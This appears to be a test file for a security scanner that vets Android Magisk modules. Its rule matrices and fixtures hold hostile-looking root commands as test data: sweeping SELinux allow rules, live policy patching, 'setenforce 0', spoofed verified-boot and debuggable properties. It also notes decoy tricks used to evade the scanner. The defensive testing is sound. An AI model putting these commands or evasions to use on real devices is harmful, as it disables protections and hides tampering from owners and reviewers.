    assert.notEqual(r.riskLevel, 'low', '这四类都不许停在 low —— 之前是 low → auto-approve');
  });
}

test('sepolicy.rule 只加 deny/auditallow 不命中 RELAX；resetprop 改自有键不命中', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2b', files: [['module.prop', moduleProp('eval.t2b')],
    ['sepolicy.rule', 'deny magisk magisk:process *;\n'],
    ['service.sh', 'resetprop ro.my.mod.thing ok\n']] }));
  assert.equal(r.riskLevel, 'low');
});

// —— 反例的加强版：注释、echo 说明、变量名、getprop 只读，四种合法写法都不许命中 ——
const ROOT_SAFE_MODULE = [
  ['sepolicy.rule', [
    '# 本模块不给任何域开执行权限，下面全是收紧与抑制日志的写法：',
    'dontaudit su * fs:file { read write };',
    'auditallow magisk magisk:process *;',
    'allow magisk magisk:file { read write create getattr };',
    'allow untrusted_app system_file:file { read write open getattr };',
  ].join('\n')],
];

test('SELINUX_POLICY_RELAX：命中矩阵（10 命中 / 12 不命中，含注释与字符串常量）', () => {
  const hit = [
    'allow su * fs:file { read write open execute };',
    'allow su u:r:magisk:s0 fs:file { read write open execute };',
    'allow magisk daemons:process { transition noatsecure execute }',
    'allow su * * { * };',
    '  allow untrusted_app system_file:file { execute };',
    'allow su fs:file { read write setattr };',
    'allow appdomain magisk_data:file { read execute_no_trans };',
    'allow init * magisk:process { fork execmem };',
    'allow su shell:process { create setattr getattr };',
    'allow xyz abc:def { execute } ; # 行尾还有说明',
  ];
  const safe = [
    'deny magisk magisk:process *;',
    'dontaudit su * fs:file { read write };',
    'auditallow magisk magisk:process *;',
    'typepermissive su;',
    '# allow su * fs:file { execute };',
    '   # 注释：allow su * * { execute } 只是说明文字',
    'allow magisk magisk:file { read write create getattr }',
    'allow su shell:process transition;',
    'SELINUX_ALLOW="allow su * fs:file { execute }"',
    'echo "allow su * fs:file { execute }"',
    'allow su * fs:file { };',
    'genfscon magiskfs /data/adb/magisk u:object_r:magisk_file:s0',
  ];
  assert.equal(hit.length + safe.length, 22);
  for (const line of hit) assertHit('SELINUX_POLICY_RELAX', line, line);
  for (const line of safe) assertNoHit('SELINUX_POLICY_RELAX', line, line);
  // 证据字段形状与既有规则一致（file/line/snippet/message/advice 都在）
  const [f] = hits('SELINUX_POLICY_RELAX', '# 注释\nallow su * fs:file { execute };');
  assert.equal(f.line, 2, '行号是 sepolicy.rule 的行号');
  assert.equal(f.file, 'customize.sh');
  assert.match(f.message, /放宽 SELinux 策略/);
  assert.ok(f.advice && f.snippet);
});

test('MAGISK_POLICY_LIVE：命中矩阵（8 命中 / 6 不命中）', () => {
  const hit = [
    'magiskpolicy --live "allow su * *"',
    'magiskpolicy --live --output precompiled_sepolicy',
    'su -c \'magiskpolicy --live "allow init * *"\'',
    '  supolicy --live "allow magisk su:process *";',
    'busybox sh -c \'magiskpolicy --live "allow su * fs:file { execute }"\'',
    'magiskpolicy --live "allow zygote system_file:dir { search write }" && magiskpolicy --live "allow su * *"',
    'echo "$(magiskpolicy --live allow su * *)"',
    'log_and_patch() { magiskpolicy --live "allow su * *" }',
  ];
  const safe = [
    '# magiskpolicy --live "allow su * *"',
    'magiskpolicy --stdin < sepolicy.rule',
    'echo "usage: magiskpolicy --live is not used here"',
    'echo "log: magiskpolicy --live 未使用"',
    'ui_print "本模块不调用 supolicy --live"',
    'MAGISK_POLICY_LIVE_DESCR="supolicy 已废弃"',
  ];
  assert.equal(hit.length + safe.length, 14);
  for (const line of hit) assertHit('MAGISK_POLICY_LIVE', line, line);
  for (const line of safe) assertNoHit('MAGISK_POLICY_LIVE', line, line);
});

test('VERIFIED_BOOT_SPOOF：命中矩阵（8 命中 / 8 不命中，getprop 只读与 echo 说明不命中）', () => {
  const hit = [
    'resetprop -w ro.boot.verifiedbootstate green',
    'resetprop ro.boot.verifiedbootstate green',
    'setprop ro.boot.flash.locked 0',
    'resetprop --delete ro.boot.vbmeta.device_state',
    'su -c "resetprop -n ro.boot.veritymode enforcing"',
    'resetprop ro.my.thing a && resetprop -w ro.boot.verifiedbootstate green',
    'echo "$(resetprop -w ro.boot.verifiedbootstate green)"',
    'echo "resetprop -w ro.boot.verifiedbootstate green" > /data/adb/s.sh',
  ];
  const safe = [
    '# resetprop -w ro.boot.verifiedbootstate green',
    'getprop ro.boot.verifiedbootstate',
    'echo "resetprop -w ro.boot.verifiedbootstate green"',
    'ui_print "- 本模块不会改 ro.boot.verifiedbootstate"',
    'resetprop ro.my.mod.thing ok',
    'PROP_RO_BOOT_VERIFIEDBOOTSTATE=green',
    'ro.boot.verifiedbootstate=green',
    'setprop ro.product.model Pixel',
  ];
  assert.equal(hit.length + safe.length, 16);
  for (const line of hit) assertHit('VERIFIED_BOOT_SPOOF', line, line);
  for (const line of safe) assertNoHit('VERIFIED_BOOT_SPOOF', line, line);
});

test('DEBUGGABLE_ENABLE：命中矩阵（6 命中 / 9 不命中，值走变量或只读不命中）', () => {
  const hit = [
    'resetprop -w ro.debuggable 1',
    'setprop ro.secure 0',
    'resetprop ro.debuggable=1',
    'su -c "resetprop -n ro.secure 0"',
    'resetprop -w ro.secure 0  # 说明写在行尾',
    'echo "$(resetprop ro.debuggable 1)"',
  ];
  const safe = [
    '# resetprop -w ro.debuggable 1',
    'getprop ro.debuggable',
    'resetprop ro.debuggable',
    'resetprop -w ro.debuggable $VALUE',
    'echo "setprop ro.secure 0"',
    'echo "setprop ro.secure 0 (debug only)"',
    'resetprop ro.mydebuggable 1',
    'setprop ro.build.version.security_patch 2021-01-05',
    'ro.debuggable=1',
  ];
  assert.equal(hit.length + safe.length, 15);
  for (const line of hit) assertHit('DEBUGGABLE_ENABLE', line, line);
  for (const line of safe) assertNoHit('DEBUGGABLE_ENABLE', line, line);
  assert.equal(assertHit('DEBUGGABLE_ENABLE', 'resetprop -w ro.debuggable 1')[0].severity, 'medium',
    'DEBUGGABLE_ENABLE 是 medium —— 不是 high');
});

test('PROP_BOOT_SPOOF（评审 F4）：.prop 直写键名命中；注释与描述文字不命中', () => {
  const hit = [
    'ro.boot.verifiedbootstate=green',
    'ro.boot.vbmeta.device_state=unlocked',
    'ro.boot.flash.locked=0',
    '  ro.boot.veritymode=enforcing',
  ];
  const safe = [
    '#ro.boot.verifiedbootstate=green',
    '# ro.boot.flash.locked=0',
    'getprop ro.boot.verifiedbootstate',
    'description=ro.boot.verifiedbootstate=green 这个模块不上锁',
    'ro.debuggable=1',
    'ro.boot.verifiedbootstatex=green',
  ];
  assert.equal(hit.length + safe.length, 10);
  for (const line of hit) assertHit('PROP_BOOT_SPOOF', line, line);
  for (const line of safe) assertNoHit('PROP_BOOT_SPOOF', line, line);
  // F4 的实测原句：这条通道以前一条规则都不咬
  const fs = scanContent('system.prop', 'ro.boot.verifiedbootstate=green\nro.debuggable=1\nro.secure=0',
    [PROP_BOOT_SPOOF]);
  assert.equal(fs.length, 1, '四个 boot 键里只有 verifiedbootstate 命中（本规则只管 boot 家族；'
    + '另两行由 fix3-P9 的 PROP_SECURITY_WEAKEN 兜住，见「fix3-P9：新规则接进规则表」那条）');
  assert.equal(fs[0].line, 1);
  assert.equal(fs[0].severity, 'high', '已拍定 2026-10-13：纳入，severity high');
});

test('F4 端到端：只在 system.prop 里写 boot 状态的模块不再被判 low', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2c',
    files: [['module.prop', moduleProp('eval.t2c')], ['system.prop', 'ro.boot.verifiedbootstate=green\n']] }));
  assert.ok(r.findings.some((f) => f.ruleId === 'PROP_BOOT_SPOOF'), JSON.stringify(r.findings));
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block', 'high 只可能是不自动合入（block），不是拒绝投稿');
});

// —— 扫描面：sepolicy.rule / *.rc / *.te / 有 shebang 的无后缀条目 ——

test('classify：sepolicy.rule / .rc / .te / 有 shebang 的无后缀条目进扫描面，后缀相同的伪装二进制仍归 binaries', () => {
  const mk = (name, content) => ({ name, content, size: content.length, head: Buffer.from(content, 'utf8') });
  const c = classify([
    mk('sepolicy.rule', 'allow su * fs:file { execute };\n'),
    mk('common/service.rc', 'service myd /system/bin/sh $MODDIR/run.sh\n'),
    mk('sepolicy.te', 'allow magisk magisk:process { execute };\n'),
    mk('post-fs-data', '#!/system/bin/sh\nresetprop -w ro.debuggable 1\n'),
    mk('NOTICE', 'plain text, no shebang\n'),
    mk('evil/sepolicy.rule', '\u0000\u0000\u0000 allow su * * { * }'),
  ]);
  assert.deepEqual(c.policy.map((f) => f.name), ['sepolicy.rule', 'common/service.rc', 'sepolicy.te'],
    '三类「会被策略引擎/init 真读」的文件进 policy 桶');
  assert.deepEqual(c.otherScripts.map((f) => f.name), ['post-fs-data'],
    '无后缀但首行 shebang 的条目按脚本纳入（post-fs-data 不带 .sh 不再免检）');
  assert.deepEqual(c.others.map((f) => f.name), ['NOTICE'], '无后缀又没 shebang 的纯文本仍然不进扫描面');
  assert.deepEqual(c.binaries.map((f) => f.name), ['evil/sepolicy.rule'],
    '魔数判定先于后缀：改名成 sepolicy.rule 的机器码照样落到 binaries');
});

test('hasShebang 只认头两字节的 #!，不看整段内容也不整读', () => {
  assert.equal(hasShebang(Buffer.from('#!/system/bin/sh\n', 'utf8')), true);
  assert.equal(hasShebang(Buffer.from('#!/system/bin/sh', 'utf8')), true);
  assert.equal(hasShebang(Buffer.from('# comment\n#!/x\n', 'utf8')), false, '第二行的 #! 不算 shebang');
  assert.equal(hasShebang(Buffer.from('#', 'utf8')), false, '只有一个字节不能越界读');
  assert.equal(hasShebang(Buffer.from('\u0000#!/x', 'utf8')), false);
  assert.equal(hasShebang(undefined), false);
});

test('端到端：sepolicy.rule 的命中带着文件与行号进报告，且 Markdown 有「root 提权语义」这一节', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2d', files: [
    ['module.prop', moduleProp('eval.t2d')],
    ['sepolicy.rule', '# 说明\nallow su u:r:magisk:s0 fs:file { read execute };\n'],
  ] }));
  const f = r.findings.find((x) => x.ruleId === 'SELINUX_POLICY_RELAX');
  assert.ok(f, JSON.stringify(r.findings.map((x) => x.ruleId)));
  assert.equal(f.file, 'sepolicy.rule');
  assert.equal(f.line, 2, '注释行不进命中，行号是第 2 行');
  assert.equal(f.category, 'root');
  assert.equal(f.severity, 'high');
  const md = renderMarkdown(r);
  assert.match(md, /### root 提权语义/);
  assert.match(md, /sepolicy\.rule/, '文件清单里要看得见 sepolicy.rule');
  assert.ok(r.scripts.some((s) => s.name === 'sepolicy.rule'), '全文内嵌也要有它，否则人工复核看不到');
  assert.ok(r.inventory.policyFiles.some((s) => s.name === 'sepolicy.rule'), JSON.stringify(r.inventory));
});

test('端到端：有 shebang 的无后缀 post-fs-data 里的 --live 不再免检', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2e', files: [
    ['module.prop', moduleProp('eval.t2e')],
    ['post-fs-data', '#!/system/bin/sh\nmagiskpolicy --live "allow su * *"\n'],
  ] }));
  assert.ok(r.findings.some((f) => f.ruleId === 'MAGISK_POLICY_LIVE'), JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(r.riskLevel, 'high');
});

// —— 接线与定级 ——

test('root 五条规则都接进 CONTENT_RULES，分类/级别与简报一致且参与定级', () => {
  const expect = [
    ['SELINUX_POLICY_RELAX', 'high'], ['MAGISK_POLICY_LIVE', 'high'], ['VERIFIED_BOOT_SPOOF', 'high'],
    ['DEBUGGABLE_ENABLE', 'medium'], ['PROP_BOOT_SPOOF', 'high'],
  ];
  for (const [id, sev] of expect) {
    assert.ok(CONTENT_RULES.some((r) => r.id === id), `${id} 不进 CONTENT_RULES 的话 scanContent 根本不会跑它`);
    const rule = RULES_BY_ID[id];
    assert.equal(rule.category, 'root', `${id} 的分类`);
    assert.equal(rule.severity, sev, `${id} 的 severity`);
    assert.ok(rule.title && rule.advice, `${id} 缺 title/advice`);
    const finding = rule.scan('service.sh', 'x').length ? rule.scan('service.sh', 'x')[0] : null;
    assert.ok(finding === null || countsTowardRisk(finding), `${id} 不许出现 info 级`);
  }
  assert.equal(SEVERITY_ORDER[RULES_BY_ID.DEBUGGABLE_ENABLE.severity], 2, 'medium 是 2 档');
});

test('每条规则的 category 都在 CATEGORY_LABEL 里有标题（报告分组不许出现空标题）', () => {
  const cats = new Set(CONTENT_RULES.map((r) => r.category));
  for (const c of cats) assert.ok(CATEGORY_LABEL[c], `分类 ${c} 没有中文标题`);
  assert.equal(CATEGORY_LABEL.root, 'root 提权语义');
});

test('误伤哨兵：一个正经模块（注释 sepolicy.rule + .rc 服务定义 + 只读 getprop + echo 说明）仍然判 low 并自动放行', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.t2legit', files: [
    ['module.prop', moduleProp('eval.t2legit')],
    ['customize.sh', '#!/system/bin/sh\nui_print "- installing"\ncp -f busybox $MODPATH/system/xbin/bb\nrm -rf $MODDIR/cache\n'],
    ['service.sh', [
      '#!/system/bin/sh',
      'MODDIR=${0%/*}',
      'getprop ro.boot.verifiedbootstate',
      'echo "本模块只调整音量，不会 resetprop ro.boot.verifiedbootstate green"',
      'echo "也不会 setprop ro.secure 0"',
      'while [ ! -f /data/adb/magisk/magisk ]; do sleep 1; done',
    ].join('\n') + '\n'],
    ['sepolicy.rule', ROOT_SAFE_MODULE[0][1]],
    ['system.prop', 'ro.my.mod.enabled=1\n'],
    ['common/service.rc', 'service mydaemon /system/bin/sh /data/adb/modules/eval.t2legit/daemon.sh\nclass late_start\n'],
    ['daemon.sh', '#!/system/bin/sh\nlog_msg "started"\n'],
  ] }), { changeType: 'first' });
  const rootHits = r.findings.filter((f) => f.category === 'root');
  assert.deepEqual(rootHits.map((f) => `${f.ruleId}@${f.file}:${f.line}`), [],
    'root 规则在正经模块上一条都不许命中：' + JSON.stringify(rootHits));
  assert.equal(r.riskLevel, 'low', JSON.stringify(r.findings));
  assert.equal(r.decision.action, 'auto-approve');
  assert.ok(r.scripts.some((s) => s.name === 'sepolicy.rule') && r.scripts.some((s) => s.name === 'common/service.rc'),
    '不进扫描面的话「没命中」只是因为没看，所以这里必须证明它确实被读过');
});




// ---------------------------------------------------------------------------
// ⑨ 第二轮修复（fix2）：P1 引用语法 / P2 变量间接 fail-closed / P3 运行期覆写 /
//    P4 死分支与规则文本一致性 / P5 桶与分类守卫 / P6 注释豁免边界
// ---------------------------------------------------------------------------

// —— P1：EXEC_BUNDLED_FILE 语法补洞 ——
// 评审实测（fix2 开工前逐条跑过）：下面 6 行在旧语法下全部 0 findings → low → auto-approve。

test('fix2-P1：exec/setsid/trap 引号命令串/子 shell/无空白 sh —— 动词式引用必须被检出', () => {
  for (const line of [
    'exec $MODDIR/x.bin',
    'setsid $MODDIR/x.bin',
    'trap "sh $MODDIR/x" EXIT',
    '(sh $MODDIR/x.bin)',
    'sh"$MODDIR/x"',
    'exec "${MODDIR}/clean" && exit 0',
    'nohup $MODDIR/helper &',
  ]) {
    assert.ok(EXEC_BUNDLED_FILE.scan('service.sh', line).length > 0, 'EXEC_BUNDLED_FILE 未检出: ' + line);
  }
});

test('fix2-P1：解释器动词 + 裸 $VAR 与 for-glob + do $VAR 必须被检出（EXEC_INDIRECT）', () => {
  for (const line of [
    'sh $X',
    'bash ${X}',
    'for f in $MODDIR/*.bin; do $f; done',
    'trap "exec $X" EXIT',
  ]) {
    assert.ok(EXEC_INDIRECT.scan('service.sh', line).length > 0, 'EXEC_INDIRECT 未检出: ' + line);
  }
  // 假阳性边界：迭代子与模块目录无关的常规循环不许牵动（不许反向扩成「整行含 $MODDIR 就亮」）
  assert.equal(EXEC_INDIRECT.scan('service.sh', 'for f in a b; do $f; done').length, 0);
  // 模块目录前缀变量本身由 EXEC_BUNDLED_FILE 负责，不重复算间接
  assert.equal(EXEC_INDIRECT.scan('service.sh', 'sh "$MODDIR/install.sh"').length, 0);
});

test('fix2-P1 端到端：六条实测曾 auto-approve 的形态全部转人工', async () => {
  for (const line of [
    'exec $MODDIR/x.bin',
    'setsid $MODDIR/x.bin',
    'trap "sh $MODDIR/x" EXIT',
    '(sh $MODDIR/x.bin)',
    'sh"$MODDIR/x"',
    'for f in $MODDIR/*.bin; do $f; done',
  ]) {
    const zip = makeModuleZip({ id: 'eval.f2p1', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      ['x.bin', 'setenforce 0\n'],
      ['x', 'setenforce 0\n'],
    ] });
    const r = await scanToReport(zip, { changeType: 'first' });
    assert.equal(r.riskLevel, 'high', line + ' → ' + r.riskLevel + '/' + r.decision.action + '（旧语法实测 low/auto-approve）');
    assert.equal(r.decision.action, 'block', line);
  }
});

// —— P2：变量间接必须 fail closed ——

test('fix2-P2：钉得住的变量按包内条目解析升级；钉不住的按「未验证引用」报 high；指向包外的撤销', async () => {
  // (1) 钉得住：X 字面指向包内载荷 —— 必须解析成真实条目、进扫描面、逐行扫
  const pinnedZip = makeModuleZip({ id: 'eval.f2p2a', files: [
    ['service.sh', '#!/system/bin/sh\nX="$MODDIR/payload.bin"\nsh $X\n'],
    ['payload.bin', 'setenforce 0\n'],
  ] });
  const a = await scanToReport(pinnedZip, { changeType: 'first' });
  // Task 2.7（fix10-P11）：payload.bin 是可读文本，本来就在 feed 上，所以 escalated 空；
  // 「钉得住的变量要解析成包内条目并把它读掉」这条主张由 SELINUX_DISABLE + high + block 钉着。
  assert.ok(a.scripts.some((s) => s.name === 'payload.bin'),
    '变量钉到的条目必须在被逐行扫过的文件里：' + JSON.stringify(a.scripts.map((s) => s.name)));
  assert.deepEqual(a.escalated, [], 'payload.bin 已在 feed 上：不许记一笔没发生过的升级');
  assert.ok(a.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'payload.bin'),
    '读到了就要真扫：' + JSON.stringify(a.findings.map((f) => f.ruleId)));
  assert.equal(a.riskLevel, 'high');
  assert.equal(a.decision.action, 'block');

  // (2) 钉不住：扫描器无法确定 $X 指向哪 —— 报 high 并披露「没读过它」，不许悄悄放过
  const b = await scanToReport(makeModuleZip({ id: 'eval.f2p2b', files: [
    ['service.sh', '#!/system/bin/sh\nsh $X\n'],
  ] }), { changeType: 'first' });
  const fb = b.findings.find((x) => x.ruleId === 'EXEC_INDIRECT');
  assert.ok(fb, '钉不住的变量执行必须报：' + JSON.stringify(b.findings.map((x) => x.ruleId)));
  assert.equal(fb.severity, 'high');
  assert.equal(b.riskLevel, 'high', 'fail closed：钉不住 ≠ 干净');
  assert.equal(b.decision.action, 'block');
  assert.equal(fb.advice, EXEC_UNPINNED_ADVICE, '报告要写明这条引用没被验证，而不是承诺读过');
  assert.ok(!fb.advice.includes('读一遍'), '没读过的东西不许在建议里说「读一遍」');

  // (3) 变量钉到包外路径（系统二进制）：不是包内引用，撤销，别淹人工队列
  const c = await scanToReport(makeModuleZip({ id: 'eval.f2p2c', files: [
    ['service.sh', '#!/system/bin/sh\nSCRIPT=/system/bin/sh\nsh $SCRIPT -c id\n'],
  ] }), { changeType: 'first' });
  assert.ok(!c.findings.some((x) => x.ruleId === 'EXEC_INDIRECT'), JSON.stringify(c.findings.map((x) => x.ruleId)));
  assert.equal(c.riskLevel, 'low', JSON.stringify(c.findings));

  // (4) 变量钉到包内且该条目已在扫描面：与裸写路径同判（撤销），但必须是「解析过」的撤销
  const d = await scanToReport(makeModuleZip({ id: 'eval.f2p2d', files: [
    ['service.sh', '#!/system/bin/sh\nX="$MODDIR/helper.sh"\nsh $X\n'],
    ['helper.sh', 'echo ok\n'],
  ] }), { changeType: 'first' });
  assert.ok(!d.findings.some((x) => x.ruleId === 'EXEC_INDIRECT'), JSON.stringify(d.findings.map((x) => x.ruleId)));
  assert.equal(d.riskLevel, 'low');
});

// —— P3：名字在扫描面 ≠ 字节被证实 ——

test('fix2-P3：向模块目录写出/解包 + 执行同名条目必须升级（同名 ≠ 同字节）', async () => {
  const zip = makeModuleZip({ id: 'eval.f2p3', files: [
    ['customize.sh', '#!/system/bin/sh\nunzip -o /sdcard/x.zip -d $MODDIR\nsh $MODDIR/helper.sh\n'],
    ['helper.sh', 'echo benign\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('MODDIR_RUNTIME_WRITE'), '写出/解包进模块目录本身要成为发现：' + JSON.stringify(ids));
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), '引用撤销判据在存在覆写证据时必须失效（旧行为实测 low/auto-approve）');
  const eb = r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.match(eb.snippet, /helper\.sh/, '报告要指名造成升级的那条引用');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');

  // 反向哨兵：没有写出证据的常规多脚本模块照旧撤销（不许把 P3 变成「凡引用皆 high」）
  const ok = await scanToReport(makeModuleZip({ id: 'eval.f2p3ok', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/install.sh\n'],
    ['install.sh', 'echo install\n'],
  ] }), { changeType: 'first' });
  assert.ok(!ok.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'), JSON.stringify(ok.findings.map((f) => f.ruleId)));
  assert.ok(!ok.findings.some((f) => f.ruleId === 'MODDIR_RUNTIME_WRITE'));
  assert.equal(ok.riskLevel, 'low');
  // fix8-E 改动此行（原为 'auto-approve'）：这条反向哨兵钉的是「没有覆写证据时撤销照旧」，
  // 上面两条断言仍在钉这件事，且 EXEC_BUNDLED_FILE 确实被撤掉了。
  // 但撤销一旦发生（这里是常规写法 sh $MODDIR/install.sh），E 就关掉自动通道 ——
  // 旧期望与本轮规格直接冲突，按规格改；代价落在决策上，不落进散文。
  assert.equal(ok.decision.action, 'request-review', '有撤销记录就不自动放行（fix8-E）');
  assert.deepEqual(ok.revokedBundledRefs.map((x) => x.resolvedEntry), ['install.sh'], JSON.stringify(ok.revokedBundledRefs));

  // 写出发现的证据字段要齐全
  const wr = r.findings.find((f) => f.ruleId === 'MODDIR_RUNTIME_WRITE');
  assert.equal(wr.file, 'customize.sh');
  assert.equal(wr.line, 2);
});

test('fix2-P3：A 文件解包覆写、B 文件执行同名条目 —— 引用不许按「已扫过」撤销', async () => {
  const zip = makeModuleZip({ id: 'eval.f2p3x', files: [
    ['service.sh', '#!/system/bin/sh\nunzip -o /sdcard/pack.zip -d ${MODDIR}/\n'],
    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/helper.sh\n'],
    ['helper.sh', 'echo benign\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.equal(r.riskLevel, 'high', '跨文件覆写不许停在 low：' + JSON.stringify(r.findings.map((f) => f.ruleId)));
  const cross = r.findings.find((f) => f.file === 'customize.sh' && f.ruleId === 'MODDIR_RUNTIME_WRITE');
  assert.ok(cross, '必须有一条指名 customize.sh 的覆写升级发现：' + JSON.stringify(r.findings.filter((f) => f.category === 'execution')));
});

test('fix2-P3 报告错配：良性最左引用 + 解析不到的引用同行时，snippet 必须指名后者', async () => {
  const zip = makeModuleZip({ id: 'eval.f2p3b', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/install.sh && sh $MODDIR/ghost.dat\n'],
    ['install.sh', 'echo ok\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
  assert.ok(f);
  assert.match(f.snippet, /ghost\.dat/,
    '旧行为实测 snippet 曾被写成 "sh $MODDIR/install.sh"（良性最左），报告指鹿为马');
  assert.ok(!/install\.sh/.test(f.snippet), '报告不许把没造成升级的引用写成风险本体');
});

// —— P4 ——

test('fix2-P4b：SELINUX_POLICY_RELAX 权限集里的 enforce 分支不许是死词', () => {
  // `enforceforce` 不是任何真实策略里存在的权限名（旧 pattern 里的死分支，评审点名）；
  // setenforce 才是 kernel:security 类里真实存在、且允许运行时关强制的权限。
  assertHit('SELINUX_POLICY_RELAX', 'allow init kernel:security { setenforce };');
  assertHit('SELINUX_POLICY_RELAX', 'allow su kernel:security { setenforce setbool };');
  // 反向：不含执行类权限的 allow 不命中（别把集合换成 . 通配）
  assertNoHit('SELINUX_POLICY_RELAX', 'allow init kernel:security { read };');
});

test('fix2-P4a：PROP_BOOT_SPOOF 只覆盖四个 ro.boot.* 完整性键 —— 规则文本与 pattern 同一个真相', () => {
  // 本快照里 title/message/advice 没有承诺 ro.*/persist.* 广覆盖（评审描述的失配在本仓不存在），
  // 这里把它钉成一致性锁：谁把文案改宽而 pattern 没跟着改宽，这条就红。
  const rule = RULES_BY_ID.PROP_BOOT_SPOOF;
  for (const txt of [rule.title, rule.advice]) {
    assert.ok(!/persist\./.test(txt), 'advice/title 不许承诺 persist.* 而 pattern 不覆盖：' + txt);
  }
  for (const line of [
    'ro.boot.verifiedbootstate=green', 'ro.boot.vbmeta.device_state=unlocked',
    'ro.boot.flash.locked=0', 'ro.boot.veritymode=enforcing',
  ]) assertHit('PROP_BOOT_SPOOF', line, line);
  // 明确不在本规则范围内的键（.prop 通道的已知缺口，报告如实披露，不许文案与行为分叉）
  for (const line of ['persist.sys.usb.config=adb', 'ro.secure=1', 'sys.usb.controller=adb_root']) {
    assertNoHit('PROP_BOOT_SPOOF', line, line);
  }
});

// —— P5 / P6：桶与分类守卫 ——

test('fix2-P5：classify 的桶集合与 scanZip 的扫描面桶必须一一对应（新桶不许静默消失）', () => {
  const p = writeZip('buckets.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: '#!/system/bin/sh\nexit 0\n' },           // canonical
    { name: 'extra/helper.sh', content: 'echo x\n' },                          // otherScripts
    { name: 'META-INF/com/google/android/updater-script', content: 'x\n' },    // handlers
    { name: 'system.prop', content: 'ro.x.y=1\n' },                            // props
    { name: 'sepolicy.rule', content: 'dontaudit su su:file read;\n' },        // policy
    { name: 'blob', content: Buffer.from('\x7fELF\x02\x01', 'latin1') },       // binaries
    { name: 'README.md', content: 'docs\n' },                                  // others
  ]);
  const files = readZip(p).files;
  const buckets = Object.keys(classify(files)).filter((k) => k !== 'propEntry');
  assert.deepEqual(buckets.sort(),
    [...SCAN_TARGET_BUCKETS, 'binaries', 'others'].sort(),
    'classify 新增了桶而 scanZip 没接：这就是 P5 复现过的静默消失');
  const r = scanZip(p, { changeType: 'first' });
  // 每一个扫描面桶都要同时出现在 inventory、scripts 与 Markdown 文件清单里
  const invKeys = { canonical: 'canonicalScripts', otherScripts: 'otherScripts', handlers: 'handlers', props: 'props', policy: 'policyFiles' };
  const md = renderMarkdown(r);
  for (const b of SCAN_TARGET_BUCKETS) {
    const c = classify(files)[b];
    assert.ok(c.length, `夹具必须让桶 ${b} 非空，否则这条守卫是空转`);
    const rows = r.inventory[invKeys[b]];
    assert.ok(rows && rows.length === c.length, `inventory.${invKeys[b]} 少了 ${b} 桶的条目`);
    for (const f of c) {
      assert.ok(r.scripts.some((s) => s.name === f.name), `${f.name}（桶 ${b}）必须进 report.scripts`);
      assert.ok(md.includes(f.name), `${f.name}（桶 ${b}）必须出现在 Markdown 清单里`);
    }
  }
});

test('fix2-P5：分类未识别的 finding 必须在 Markdown 里显式披露，不许渲染成没人看得见的分组', () => {
  const p = writeZip('unknowncat.zip', [{ name: 'module.prop', content: CLEAN_PROP }]);
  const r = scanZip(p, { changeType: 'first' });
  r.findings = [{ ruleId: 'SOMETHING_NEW', category: 'quantum', severity: 'high', file: 'x.sh', line: 1,
    snippet: 'x', message: 'm', advice: 'a' }];
  const md = renderMarkdown(r);
  assert.match(md, /分类未识别[：:] ?quantum/, '未知分类至少要写明「分类未识别」，这是 P5 那类白名单遗忘的最后防线');
});

test('fix2-P6：豁免只认整行注释 —— 行尾 # 的 sepolicy 授权照报（.te 没有 # 语法）', () => {
  // 命中的行尾注释形状（magiskpolicy 会原样应用这行）
  assertHit('SELINUX_POLICY_RELAX', 'allow su * fs:file { execute } # comment');
  // 整行注释豁免维持既有先例（不许反向扩大成「行内含 # 就豁免」）
  assertNoHit('SELINUX_POLICY_RELAX', '# allow su * fs:file { execute }');
  assertNoHit('MAGISK_POLICY_LIVE', '# magiskpolicy --live "allow su * *"');
  assertHit('MAGISK_POLICY_LIVE', 'magiskpolicy --live "allow su * *" # 行尾说明');
});

test('fix2-P6：inventory.policyFiles 不是死字段 —— Markdown 清单要渲染出策略文件行', () => {
  const r = scanZip(writeZip('polinv.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'sepolicy.rule', content: 'dontaudit su su:file read;\n' },
  ]), { changeType: 'first' });
  assert.ok(r.inventory.policyFiles.some((f) => f.name === 'sepolicy.rule'));
  assert.match(renderMarkdown(r), /策略\/初始化文件[^\n]*sepolicy\.rule/);
});

// ---------------------------------------------------------------------------
// ⑩ 第三轮修复（fix3）：P7 行工厂看全部匹配 / P8 permissive / P9 .prop 直写削弱安全键
// ---------------------------------------------------------------------------
//
// 评审在 cd79136 的规则表上逐条实测（单行输入），四条同根因：
//   echo "resetprop -w ro.boot.verifiedbootstate green"; resetprop -w ro.boot.verifiedbootstate green -> 0 hits
//   echo "magiskpolicy --live"; magiskpolicy --live "allow su * fs:file { execute_no_trans }"         -> 0 hits
//   rm -rf "$TMP_PATH"; rm -rf /data                                                                  -> medium（裸 /data 是 high）
//   resetprop -w ro.boot.verifiedbootstate green                                                      -> high（基数必须仍是 1）
// 根因：makeLineRule.scan 只取一行里**第一个**匹配，再拿这一个匹配去判豁免与定档 ——
// 于是「写在前面的那半行」决定后面真载荷要不要被看一眼。审批闸里的 fail-open：
// 前置一句 echo 说明就能让所有 root 语义规则闭嘴，包判 low，decide() 自动合入。

const P7_BOOT_DECOY = 'echo "resetprop -w ro.boot.verifiedbootstate green"; resetprop -w ro.boot.verifiedbootstate green';
